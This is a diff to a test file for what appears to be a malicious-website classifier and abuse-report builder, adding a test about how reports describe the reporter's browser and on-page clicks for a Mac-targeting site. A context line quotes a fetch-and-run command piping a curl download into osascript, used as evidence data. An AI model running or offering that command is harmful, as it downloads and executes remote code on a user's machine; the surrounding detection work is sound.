@@ -549,6 +549,25 @@ test("a quote of what a shown command decodes to is corroborated by the local de
 	expect(classify(macmorrow, { finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "curl -sfL https://keychainagent.pro/wksxgj/yX1fQWFGw9rp | osascript -l JavaScript" })).toMatchObject({ finding: "insufficient_evidence" });
 });
 
+test("a page's report names the reporter's browser it was captured with, and clicks that stay on the page are no earlier pages", () => {
+	// Production case 380697679325302795: macmorrow.app shows its command only to Macs; the report
+	// listed "https://macmorrow.app/, then https://macmorrow.app/, …" once per click on a download button.
+	const url = "https://macmorrow.app/";
+	const click = (index: number): WebsiteNavigationHop => ({ index, url, hostname: "macmorrow.app", status: 200, redirectTo: url, visitorStep: { submitted: [] }, contentCaptured: false });
+	const navigationHops = [click(0), click(1), click(2), { index: 3, url, hostname: "macmorrow.app", status: 200, contentCaptured: true }];
+	const finding = { finding: "malware" as const, evidenceQuote: "Copy the Mac command" };
+	const mac = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36";
+	const evidence = buildWebsiteReportEvidence(finding, { navigationHops, reporterUserAgent: mac });
+	expect(evidence).not.toContain("earlier pages");
+	expect(evidence).toContain(`It was captured with the browser of the person who reported it, User-Agent "${mac}"; such pages show their content only to the platforms they target, so open it with that User-Agent to see what we saw.`);
+	// A phone handoff names the phone instead.
+	expect(buildWebsiteReportEvidence(finding, { navigationHops, reporterUserAgent: mac, device: "iphone" })).not.toContain(mac);
+	// A click that submitted data, or led to another page, is still a step.
+	const other = "https://macmorrow.app/install";
+	const steps = [{ ...click(0), visitorStep: { submitted: ["email" as const] } }, { ...click(1), redirectTo: other }, { index: 2, url: other, hostname: "macmorrow.app", status: 200, contentCaptured: true }];
+	expect(buildWebsiteReportEvidence(finding, { navigationHops: steps })).toContain(`earlier pages: ${url}, where our visit entered a synthetic email address and submitted, then ${url}.`);
+});
+
 test("a malware claim needs a verbatim quote and phishing never carries a malware basis", () => {
 	expect(classify(paneo, { finding: "malware", phishingBasis: "none", evidenceQuote: "Run this to get infected" })).toEqual({
 		finding: "insufficient_evidence",
